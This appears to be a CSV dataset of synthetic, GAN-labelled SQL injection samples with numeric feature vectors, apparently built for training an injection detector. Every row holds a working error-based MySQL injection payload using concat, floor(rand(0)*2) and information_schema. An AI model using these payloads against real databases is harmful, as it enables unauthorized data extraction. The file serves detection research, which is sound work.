id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000252,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000126,7.1428063362831935,333.81158447265625,96.00489807128906,58.86671829223633,143.3875732421875,-12.866122245788574,120.57377624511719,39.49507522583008,0.5176489353179932,0.40770408511161804,0.13425815105438232,0.39593416452407837,0.09661895781755447,3.950782060623169,2.4771056175231934,2.2721621990203857,0.9124138355255127,0.17267248034477234,-0.08021308481693268,-0.38282111287117004,13.48255729675293,11.635080337524414,6.631814956665039,0.2460169941186905,2.11519193649292,0.48263630270957947,-0.5420792102813721,0.2725509703159332,-0.003180295694619417,2.17568302154541,-0.012560639530420303,0.23624077439308167,0.9340802431106567,-0.35950732231140137,0.13679179549217224,2.8933839797973633,6.9100661277771,0.5528577566146851,5.563185691833496,1.3594892024993896,0.14969795942306519,0.948126494884491,-0.4100129008293152,-0.07632666826248169,0.8081371784210205,0.51654452085495,-0.07713265717029572,0.33451440930366516,0.5546870827674866,0.5242404341697693,0.08776126056909561,0.10886508971452713,-0.7148372530937195,0.4521307051181793,1.6064097881317139,0.18506740033626556,0.19408372044563293,1.0225787162780762,0.15695588290691376,0.11240988969802856,1.0028047561645508,0.5605604648590088,-1.153065800666809,-0.028140142560005188,-0.0340258963406086,0.8247762322425842,0.1256520301103592,-1.0539958477020264,0.7842690944671631,-0.6628230810165405,-1.0822347402572632,-0.7333384156227112,-0.3969017267227173,-0.38176149129867554,-0.028948470950126648,-0.6190372705459595,1.8414232730865479,0.5261093378067017,0.09183607250452042,0.2213830202817917,1.00791335105896,8.73697280883789,0.7914303541183472,0.2834480404853821,0.1788617968559265,0.45338326692581177,0.4220626950263977,-0.08377828449010849,0.7918766140937805
GAN_000253,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,7.182113459370295,301.71502685546875,88.30459594726562,39.23841857910156,130.20071411132812,-15.876397132873535,97.36882019042969,29.41828155517578,0.12894302606582642,0.4194261133670807,0.13143587112426758,0.3827943801879883,0.11847303062677383,3.8850138187408447,2.0795412063598633,2.034897565841675,0.3421582579612732,0.41327744722366333,0.11709127575159073,-0.5574674010276794,12.450949668884277,8.290188789367676,5.966150283813477,0.3162820339202881,2.243184804916382,-0.025329384952783585,-0.4750301241874695,-0.20022980868816376,-0.2679242789745331,1.4560956954956055,-0.9382529258728027,-0.02268950827419758,1.2015622854232788,-0.3164103031158447,0.233877494931221,2.7262659072875977,5.8064374923706055,1.267268180847168,3.9309606552124023,1.8653305768966675,-0.15954944491386414,0.5340558886528015,-0.41627800464630127,-0.09464392811059952,-0.30222228169441223,0.585123598575592,0.22529543936252594,0.2097424864768982,0.8750946521759033,0.32514289021492004,0.24061287939548492,-0.07292196899652481,-0.4706146717071533,0.2455625683069229,1.294545292854309,0.24278473854064941,0.34427034854888916,0.9847248196601868,-0.5592920184135437,0.17147760093212128,0.762468159198761,0.3185996115207672,-0.8079861998558044,0.6971775889396667,-0.12819670140743256,0.5426349639892578,0.49641498923301697,-1.0074747800827026,0.7380368709564209,-1.0901620388031006,-1.5915842056274414,-0.04498182609677315,0.28584766387939453,-0.269146591424942,-0.035222943872213364,-0.45486268401145935,1.4925950765609741,0.7172313332557678,0.02823754772543907,-0.051444970071315765,1.2978571653366089,9.481953620910645,0.6555718183517456,-0.0674334466457367,0.1416793316602707,0.24877390265464783,0.0959816575050354,-0.40921011567115784,0.5387400984764099
GAN_000254,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,7.094827499696616,301.6871337890625,85.68978881835938,36.89781188964844,119.9310302734375,-14.021681785583496,94.32576751708984,25.6497802734375,0.3210253119468689,0.4519241154193878,0.11752787977457047,0.37130412459373474,0.11621662974357605,3.9757091999053955,2.7751312255859375,1.4682615995407104,0.2958086133003235,0.22261500358581543,0.595790445804596,-0.41589462757110596,11.81837272644043,5.973620891571045,6.1927103996276855,0.11689332872629166,2.1765856742858887,-0.058917585760354996,-0.39127716422080994,-0.5299656391143799,-0.1750788390636444,1.3869602680206299,-1.0890237092971802,0.031183864921331406,1.556073784828186,-0.3918878138065338,0.11809563636779785,2.7433559894561768,4.747387886047363,1.377982258796692,3.948704242706299,1.8632428646087646,-0.25608769059181213,0.6029313802719116,-0.4741932451725006,-0.10023835301399231,-0.30077987909317017,0.9895454049110413,0.3210115134716034,-0.08946961909532547,0.6875390410423279,-0.07000044733285904,0.12880893051624298,-0.30474916100502014,-0.39739999175071716,-0.2294691950082779,1.1246501207351685,0.18603144586086273,0.31664198637008667,0.5996397733688354,-0.6598687767982483,0.273283988237381,0.17972221970558167,0.19130003452301025,-0.712404191493988,0.15691618621349335,-0.14714662730693817,0.7826046347618103,0.5272089242935181,-1.0834170579910278,0.902562141418457,-1.026401400566101,-1.6029540300369263,-0.6094068288803101,-0.003599895164370537,-0.5367093086242676,-0.031723301857709885,-0.6327599883079529,1.572870135307312,0.8009085059165955,-0.02718248963356018,-0.10279122740030289,1.2646815776824951,9.256061553955078,0.8232535123825073,-0.19863662123680115,0.19901789724826813,0.330877423286438,-0.12703873217105865,-0.6727550029754639,0.7668806910514832
GAN_000255,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.988304155701966,317.93426513671875,91.16230010986328,49.17041778564453,128.0300750732422,-11.644598960876465,98.96809387207031,36.4959831237793,0.4163697361946106,0.41236889362335205,0.1429165154695511,0.388715922832489,0.10293097794055939,3.9072396755218506,2.4149293899536133,1.8245933055877686,0.6309406161308289,0.2306012362241745,-0.032249756157398224,-0.2060275822877884,12.020397186279297,8.844306945800781,6.2198710441589355,-0.04845590144395828,1.984664797782898,0.18520139157772064,-0.5710592269897461,-0.18394644558429718,-0.1737760603427887,1.5704929828643799,-0.4766112267971039,0.1655472368001938,1.1411116123199463,-0.3664912283420563,0.11495727300643921,2.797804594039917,5.7334747314453125,1.1485097408294678,4.554254531860352,1.3203953504562378,-0.06176357716321945,0.7389880418777466,-0.426675945520401,-0.041384175419807434,0.21957266330718994,0.7080041170120239,0.4068807065486908,-0.013934771530330181,0.5757832527160645,0.13017062842845917,0.07881053537130356,-0.2018074244260788,-0.6993188858032227,-0.21157582104206085,1.302674651145935,0.26617294549942017,0.2544383406639099,1.2865626811981201,-0.3788183927536011,0.21721459925174713,0.7215045690536499,0.33487623929977417,-1.274042010307312,-0.008657803758978844,-0.09482339769601822,0.7420545220375061,0.31770268082618713,-1.2511601448059082,0.7277694940567017,-0.9426772594451904,-1.1663917303085327,-0.7579030394554138,-0.2187928706407547,-0.6868324279785156,-0.031042493879795074,-0.3945828974246979,1.356249213218689,0.7053326964378357,-0.2100227177143097,0.12810291349887848,1.0742923021316528,8.889504432678223,0.6782649159431458,-0.07699286937713623,0.18506751954555511,0.3705039620399475,0.1264171302318573,-0.49708130955696106,0.6833323240280151
GAN_000256,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.080322128931167,298.67779541015625,90.03002166748047,46.66120910644531,124.8653564453125,-9.222625732421875,98.07349395751953,31.75634765625,0.35518038272857666,0.38918042182922363,0.14137502014636993,0.39243197441101074,0.11586588621139526,3.9279351234436035,2.6718661785125732,1.7654484510421753,0.5632101893424988,0.13135868310928345,0.2557528614997864,-0.17390866577625275,11.58639144897461,8.778433799743652,6.108774185180664,0.41858282685279846,2.02447772026062,0.21269850432872772,-0.5261775851249695,-0.0691337138414383,0.00010217668750556186,1.5314891338348389,-0.3123261332511902,0.03562536463141441,1.6110777854919434,-0.36405622959136963,0.20655477046966553,2.6416056156158447,6.087000370025635,0.7734178900718689,4.224907875061035,1.267901062965393,0.031004048883914948,0.8279314637184143,-0.3517458736896515,-0.056012578308582306,0.03774932026863098,0.5788725018501282,0.11044572293758392,0.18582400679588318,0.535154402256012,0.21575847268104553,0.11482401937246323,0.04396863654255867,-0.5243621468544006,0.02036665566265583,1.1233221292495728,0.14384935796260834,0.15699070692062378,0.7633520364761353,-0.2356642186641693,0.1303432732820511,0.19072037935256958,0.3027489483356476,-0.7973275780677795,-0.11108313500881195,-0.05298888683319092,0.5812616944313049,0.44828617572784424,-0.8608154058456421,0.6101300120353699,-0.5314193367958069,-0.9658839702606201,-0.5016438961029053,-0.32873886823654175,-0.3608887493610382,-0.014377621933817863,-0.4761265218257904,1.6147427558898926,0.6343386769294739,0.22587931156158447,0.13505923748016357,0.9540975689888,8.85535717010498,0.7419736385345459,0.05592356249690056,0.15489539504051208,0.4446680545806885,-0.018797356635332108,-0.3539607524871826,0.632247805595398
GAN_000257,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.706960066060157,309.27655029296875,92.09365844726562,40.44342041015625,119.49356079101562,-7.345362663269043,91.44384002685547,31.599449157714844,0.2904689311981201,0.40323904156684875,0.14273343980312347,0.39500632882118225,0.11505941301584244,3.8846349716186523,1.861372709274292,1.887019395828247,0.6585245728492737,0.3075341284275055,0.18993405997753143,-0.3461463749408722,11.192838668823242,8.57706069946289,5.532076835632324,0.13612675666809082,1.997236967086792,0.20904763042926788,-0.48568570613861084,-0.34484949707984924,-0.24728423357009888,1.3834037780761719,-0.45813360810279846,-0.002487536519765854,1.6302579641342163,-0.48760613799095154,0.1391739547252655,2.627389669418335,5.453475475311279,0.8950915932655334,4.301293849945068,1.439069151878357,-0.1636018455028534,0.5714375376701355,-0.4552762806415558,-0.03786039724946022,0.0032637007534503937,0.30666428804397583,0.4397484064102173,0.1472884714603424,0.6767629384994507,0.09777069836854935,0.11086279898881912,-0.21265070140361786,-0.6750970482826233,-0.06439310312271118,1.2355070114135742,0.34348273277282715,0.3564237952232361,1.1449077129364014,-0.7143635153770447,0.064705990254879,0.6093177199363708,0.22467263042926788,-0.8635273575782776,0.2622005343437195,-0.11207813024520874,0.6353368759155273,0.4920479953289032,-0.9899695515632629,0.7840380072593689,-1.0759843587875366,-1.1892577409744263,-0.7059540152549744,-0.14399726688861847,-0.6750563383102417,-0.03816254436969757,-0.4789328873157501,1.499733328819275,0.9505517482757568,-0.2875320017337799,-0.004713222850114107,0.998698890209198,9.724385261535645,0.8067740797996521,-0.02692638710141182,0.17160826921463013,0.3604383170604706,0.19062519073486328,-0.5973629951477051,0.17959609627723694
GAN_000258,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.04544960312295,311.7544860839844,90.76008605957031,47.11592102050781,127.96026611328125,-5.951618194580078,106.70662689208984,30.59715461730957,0.6865131855010986,0.4231586754322052,0.13051337003707886,0.3844030499458313,0.10543978959321976,3.9547479152679443,2.6538422107696533,1.5463930368423462,0.4470537304878235,0.14067330956459045,0.06521270424127579,-0.24982649087905884,11.89406681060791,9.611493110656738,6.296029090881348,0.019295431673526764,2.3863461017608643,0.24008211493492126,-0.4616202712059021,-0.023403320461511612,-0.040277235209941864,1.5726196765899658,-0.4792722165584564,0.13349664211273193,1.5674368143081665,-0.1076180636882782,0.2590577006340027,2.431030035018921,6.272815704345703,1.0023455619812012,4.184895038604736,1.2879374027252197,0.12520337104797363,0.7183969020843506,-0.4529809057712555,-0.030505692586302757,0.14993569254875183,0.4758282005786896,0.3186503052711487,0.10000238567590714,0.6280778646469116,0.019456347450613976,0.20498991012573242,0.01196001935750246,-0.5409046411514282,-0.22718890011310577,1.172426700592041,0.19647318124771118,0.22940872609615326,0.5773038864135742,-0.03975742682814598,0.22338534891605377,0.1488356739282608,0.21343882381916046,-0.9269423484802246,0.003595363348722458,-0.07860801368951797,0.528485119342804,0.461908757686615,-0.8106590509414673,0.6906071901321411,-0.5630332231521606,-1.0746381282806396,-0.6729236841201782,-0.02113921195268631,-0.3626026213169098,-0.023567738011479378,-0.6593068242073059,1.4110889434814453,0.4714893698692322,0.025910284370183945,0.07335907965898514,1.0746341943740845,10.380753517150879,0.683149516582489,0.0522821806371212,0.1505827158689499,0.5355079174041748,-0.05873628705739975,-0.3067089319229126,0.6843518018722534
GAN_000259,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,5.757313629189346,309.5237121582031,88.40264129638672,43.32735824584961,117.93041229248047,-2.200634241104126,90.85790252685547,35.33352279663086,0.7553731203079224,0.39492255449295044,0.14736123383045197,0.3900447189807892,0.11529050767421722,3.841580390930176,2.097817897796631,1.0235885381698608,0.7537091970443726,0.272036075592041,0.15994609892368317,-0.09305256605148315,10.60776424407959,9.107389450073242,5.606185436248779,0.13328853249549866,2.1661102771759033,0.19670136272907257,-0.2281346619129181,-0.16717086732387543,-0.10529135912656784,1.463269829750061,-0.2023051679134369,0.014618366956710815,1.6685870885849,-0.2956241965293884,0.210703507065773,2.4977123737335205,6.433132648468018,0.9942910075187683,4.074192047119141,1.1433078050613403,0.16237905621528625,0.6437976360321045,-0.4306891858577728,-0.012183248065412045,-0.0015770122408866882,0.34814536571502686,0.17315596342086792,0.2148016095161438,0.5597459673881531,0.25461673736572266,0.197251096367836,0.0656316801905632,-0.525733470916748,0.0404232032597065,1.0099334716796875,0.1845879703760147,0.21610239148139954,0.623064398765564,-0.39590704441070557,-0.06596207618713379,0.3789101243019104,0.3294861316680908,-0.7155616283416748,0.030171897262334824,-0.07481866329908371,0.4169066548347473,0.5318186283111572,-0.6775240898132324,0.566748857498169,-0.8929935693740845,-0.8722801804542542,-0.4407309889793396,0.04354120418429375,-0.4723263382911682,-0.023655831813812256,-0.4939839541912079,1.2926862239837646,0.7460919618606567,-0.13382819294929504,0.09255022555589676,0.8844440579414368,9.085533142089844,0.7307197451591492,-0.01674478128552437,0.135491743683815,0.4349908232688904,0.24967241287231445,-0.3814069330692291,0.17838992178440094
GAN_000260,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.6866361222292205,303.7790832519531,88.52153778076172,40.77269744873047,115.63282012939453,-6.549596786499023,100.38176727294922,26.74346160888672,0.2979370951652527,0.4227589964866638,0.12635622918605804,0.38830915093421936,0.11633611470460892,3.8775510787963867,2.610239028930664,1.5829070806503296,0.7350637316703796,0.18603476881980896,0.35638824105262756,-0.1535099297761917,11.158210754394531,7.159173965454102,6.544830322265625,0.13985812664031982,2.3684072494506836,0.03835314139723778,-0.5786605477333069,-0.38071444630622864,-0.1463213860988617,1.3091068267822266,-0.7620947360992432,-0.44413280487060547,1.9989142417907715,-0.5109612941741943,0.20089291036128998,2.6696629524230957,5.578361988067627,1.2894244194030762,4.0224785804748535,1.8762178421020508,-0.16286268830299377,0.7950135469436646,-0.6248692274093628,-0.06337977200746536,0.01170320063829422,0.7834542989730835,0.3754909336566925,-0.06906760483980179,0.6274389624595642,-0.10188726335763931,0.0620223768055439,-0.27609142661094666,-0.5722335577011108,0.039222799241542816,1.2110960483551025,0.1368975192308426,0.2116713970899582,0.7911479473114014,-0.5791013240814209,0.09064878523349762,0.05503584071993828,0.3652462363243103,-0.7755328416824341,-0.1370553970336914,-0.14190128445625305,0.6279836893081665,0.5623151063919067,-0.9697363972663879,0.7410271763801575,-0.8542876839637756,-1.480364203453064,-0.7090085744857788,-0.09938991069793701,-0.8400453925132751,-0.017968395724892616,-0.4863133728504181,1.6287376880645752,0.6764297485351562,0.11504831910133362,0.005527846049517393,1.2246946096420288,9.455443382263184,0.7090105414390564,-0.08091035485267639,0.19460584223270416,0.4239208996295929,-0.11493387818336487,-0.4182835817337036,0.4999856948852539
GAN_000261,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.7477527215818585,303.4684753417969,85.8799057006836,49.726810455322266,127.57130432128906,-4.317159652709961,99.54608154296875,36.761802673339844,0.5785058736801147,0.383231520652771,0.15087565779685974,0.39405810832977295,0.11299819499254227,3.8931667804718018,2.3689026832580566,1.5353214740753174,0.6056057810783386,0.1970927119255066,-0.17427772283554077,0.043405693024396896,10.982470512390137,9.678755760192871,5.795598030090332,0.23453040421009064,2.0289549827575684,0.287289559841156,-0.43931692838668823,0.04104721173644066,-0.04858791083097458,1.3361244201660156,-0.20023638010025024,0.18897248804569244,1.5363409519195557,-0.36495357751846313,0.19957496225833893,2.4878990650177,6.3066582679748535,0.9171522259712219,4.337606906890869,0.9949633479118347,0.1722821295261383,0.8928946852684021,-0.2583581805229187,-0.03252895921468735,0.2504453957080841,0.4860479235649109,0.28391849994659424,0.189388707280159,0.451310396194458,0.23025479912757874,0.14146187901496887,0.13047568500041962,-0.5057039856910706,-0.14302100241184235,1.130062222480774,0.16476742923259735,0.16290776431560516,0.6790294647216797,-0.12910348176956177,0.1822289526462555,0.3013441264629364,0.3258911371231079,-0.729535698890686,-0.1487695574760437,-0.02785237319767475,0.47560060024261475,0.4593364894390106,-0.47202587127685547,0.5542951822280884,-0.6651506423950195,-0.8760947585105896,-0.34059375524520874,-0.26018333435058594,-0.4120102524757385,-0.005038607399910688,-0.183953195810318,1.3045389652252197,0.5216339826583862,-0.040223974734544754,0.11112628132104874,0.9110580086708069,9.11976432800293,0.6992534399032593,0.11211159080266953,0.1541525423526764,0.6047236919403076,0.13815520703792572,-0.2787483036518097,0.4660085439682007
GAN_000262,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,6.268591493335741,311.13653564453125,90.04008483886719,47.05812072753906,131.94390869140625,-8.582446098327637,89.30936431884766,37.39445114135742,0.6839823722839355,0.3727521598339081,0.15871942043304443,0.3978844881057739,0.1205243319272995,3.88459849357605,1.3734462261199951,1.547979474067688,0.7379206418991089,0.3202321231365204,0.2154727578163147,-0.4084540009498596,11.53336238861084,9.892863273620605,5.596352577209473,0.1430736780166626,1.7767709493637085,0.1892019361257553,-0.19864869117736816,0.0957425907254219,-0.30465826392173767,1.5839711427688599,-0.2113465964794159,0.116106778383255,1.278824806213379,-0.6621745824813843,0.1799953728914261,2.6461784839630127,7.484577655792236,0.7549971342086792,4.947634696960449,1.1779130697250366,-0.00826259795576334,0.8364368081092834,-0.34038275480270386,-0.05325248837471008,0.4238143563270569,0.5449178218841553,-0.0730920284986496,0.41420379281044006,0.46797680854797363,0.6737405061721802,0.15497343242168427,-0.019649991765618324,-0.5170982480049133,0.5789313316345215,1.3251737356185913,0.20219166576862335,0.26452958583831787,0.7315552830696106,-0.5614549517631531,-0.3017983138561249,1.1165804862976074,0.4988303780555725,-0.6173669099807739,0.29639941453933716,-0.04944462329149246,0.24046394228935242,0.4611348509788513,-0.7088945508003235,0.3884618282318115,-1.003993034362793,-0.7368809580802917,-0.4218190908432007,-0.17069558799266815,-0.29689955711364746,-0.03174438700079918,-0.08963911980390549,1.573459506034851,0.8466894626617432,-0.36440834403038025,0.1045069620013237,0.8150392174720764,9.073023796081543,0.9652212858200073,0.09634792804718018,0.09427899122238159,0.36124539375305176,0.7510181665420532,-0.117327980697155,0.2563233971595764
GAN_000263,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.4169434394063085,302.1291198730469,86.8910903930664,41.18181228637695,125.61261749267578,-5.798317909240723,77.1422119140625,32.802371978759766,0.6238021850585938,0.3794306218624115,0.14331749081611633,0.37716156244277954,0.12816131114959717,3.963186025619507,1.6762821674346924,1.404086947441101,0.47423893213272095,0.36141878366470337,0.278499573469162,-0.47618353366851807,11.176146507263184,8.430379867553711,4.5269904136657715,0.03850487992167473,2.1753265857696533,0.04762562736868858,-0.03896111994981766,-0.36867156624794006,-0.2724723815917969,1.4652230739593506,-0.22794240713119507,0.2171715497970581,1.4261847734451294,-0.3103909194469452,0.326679527759552,2.4978561401367188,5.734275817871094,0.8640478849411011,4.142820358276367,1.3284955024719238,-0.049142174422740936,0.25739607214927673,-0.3068287968635559,-0.04166864603757858,0.2279810905456543,0.27524226903915405,-0.17267049849033356,0.37412336468696594,0.5290402173995972,0.39353543519973755,0.32342204451560974,0.06116439774632454,-0.2106938362121582,0.5121099948883057,1.0267508029937744,0.1639733910560608,0.27142560482025146,0.7494989633560181,-0.3716168701648712,-0.2090577632188797,0.6129992008209229,0.287552148103714,-0.6717251539230347,0.46119827032089233,-0.04916009306907654,0.4563787579536438,0.5267814993858337,-0.7902557849884033,0.6194800734519958,-0.8465520739555359,-1.1464903354644775,-0.09557012468576431,-0.05691756308078766,-0.5116300582885742,-0.024223752319812775,-0.3050859868526459,1.214037537574768,0.8729540705680847,-0.3042503893375397,-0.02163325995206833,0.8675282597541809,9.949502944946289,0.9264702796936035,0.003831160021945834,0.1109236478805542,0.22043967247009277,0.6235747337341309,-0.47498205304145813,0.20250117778778076
GAN_000264,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000106,8.15377505130422,340.37640380859375,102.54527282714844,55.56108474731445,144.9088134765625,-18.671781539916992,122.67251586914062,42.327720642089844,0.21655666828155518,0.4029652774333954,0.12631870806217194,0.4005553126335144,0.09818240255117416,3.834843873977661,2.2497432231903076,2.227308750152588,1.0164251327514648,0.3326708674430847,-0.24958300590515137,-0.31623375415802,13.253498077392578,11.459012031555176,7.274660110473633,0.6123429536819458,2.1197657585144043,0.46245044469833374,-0.7873497605323792,0.30099353194236755,-0.17278069257736206,2.569716453552246,-0.03670060262084007,0.2934674322605133,0.631058931350708,-0.6182429194450378,0.1047353744506836,3.0741801261901855,6.600937843322754,0.20825740694999695,6.414839267730713,1.2665290832519531,0.05434102565050125,1.0047458410263062,-0.4037659466266632,-0.08169636130332947,0.7237853407859802,0.7227000594139099,-0.2769654095172882,0.48072168231010437,0.6630895137786865,0.7523345947265625,0.1506199687719345,0.015530009754002094,-0.9119060635566711,0.8141064047813416,1.7643945217132568,0.2631300985813141,0.17501938343048096,1.0646754503250122,0.08700469881296158,-0.122316375374794,1.412973165512085,0.9547326564788818,-1.2168642282485962,-0.09614621102809906,-0.027421047911047935,0.4599408209323883,0.03419383242726326,-1.1651716232299805,0.8555364608764648,-1.037874460220337,-1.2271625995635986,-0.7279074788093567,-0.26165762543678284,-0.46647846698760986,-0.04535244032740593,-0.7166608572006226,1.9826020002365112,0.5589966177940369,0.18644127249717712,0.19341473281383514,1.1095651388168335,7.423627853393555,0.8048774003982544,0.2954718768596649,0.18654261529445648,0.4742310345172882,0.39494335651397705,0.20611199736595154,0.6033215522766113
